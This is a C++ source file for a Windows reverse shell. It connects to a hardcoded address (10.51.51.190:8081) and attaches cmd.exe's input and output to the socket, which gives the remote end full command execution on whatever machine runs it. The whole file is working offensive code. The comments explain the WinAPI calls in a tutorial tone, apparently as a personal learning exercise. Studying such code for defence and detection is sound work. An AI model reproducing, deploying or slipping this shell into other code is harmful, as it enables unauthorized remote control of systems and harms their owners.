/*
    Author:    lemur
    GitHub:    https://github.com/1emvr
    Email:     1emvr@protonmail.com
    Date:      01/02/2023  05:15 AM

    'Simple' WinAPI reverse shell :)
    Might have to come back and do some cleanup as well.

    Most definitions are from https://learn.microsoft.com
    HAHa, comment blocks are funee
*/
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#pragma comment(lib, "Ws2_32.lib")

int main() {

    using namespace std;

    // Defining Datatypes for Handlers
    WSADATA ws_api;
    STARTUPINFO startup_info;
    PROCESS_INFORMATION process_info;

    // Connection Related Definitions
    char recv_buffer[512];
    char reverse_addr[] = "10.51.51.190";
    int port = 8081;

    // Internet Socket Address Struct
    struct sockaddr_in shell_connect_info;

    // Winsock API Startup
    WSAStartup(MAKEWORD(2,2), &ws_api);

    SOCKET socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    shell_connect_info.sin_port = htons(port);
    shell_connect_info.sin_family = AF_INET;
    shell_connect_info.sin_addr.s_addr = inet_addr(reverse_addr);

    int connection = WSAConnect(socket, (SOCKADDR *) &shell_connect_info, sizeof(shell_connect_info), NULL, NULL, NULL, NULL);

    if (connection == SOCKET_ERROR) {
        cout << "Connection to target server failed" << "\n"; exit(0);
    }
    else {
        recv(socket, recv_buffer, sizeof(recv_buffer), 0);
        memset(&startup_info, 0, sizeof(startup_info));

        startup_info.cb = sizeof(startup_info);
        startup_info.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        startup_info.hStdInput = startup_info.hStdOutput = startup_info.hStdError = (HANDLE)socket;
    }
    char command[] = "cmd.exe";

    CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &startup_info, &process_info);

    WaitForSingleObject(process_info.hProcess, INFINITE);
    CloseHandle(process_info.hProcess);
    CloseHandle(process_info.hThread);

    memset(recv_buffer, 0, sizeof(recv_buffer));
/*
    Arguments for WSASocket():

        1.Address Family (ipv4),
        2.Socket Type,
        3.Protocol Type,
        4.A pointer to WSAPROTOCOL_INFO (associated-provider info),
        5.An existing socket group ID. Not sure why we're casting since it's set to NULL,
        6.Flags set to specify additional socket attributes
*/
        
/*
    Arguments for WSAConnect():

        1.Descriptor identifying the unconnected socket,
        2.A pointer to our sockaddr definitions
        3.The length of those definitions
        4.Callee Data
        5.Quality of Service Data
        6.Uhhh, Unknown FLOWSPEC thing.
*/
        
/*
    Definitions for STARTUPINFO handle. These are set for preparation of CreateProcess():

    cb: size in bytes of the struct. 
    dwFlags: specific members of struct when window's are created:

            STARTF_USESTDHANDLES is just stdio handle.
            STARTF_USESHOWWINDOW shows a window.

    hStdInput: defines all stdio be parsed through "socket"
*/

/*
    Arguments for CreateProcess():

        1.No module,
        2.Argument to pass,
        3.Process handle not inheritable,
        4.Thread handle not inheritable,
        5.Set handle inheritance to True,
        6.Use parent's environment block,
        7.User parent's starting directory,
        8.Point to STARTUPINFO struct,
        9.Point to PROCESS_INFORMATION struct
*/
}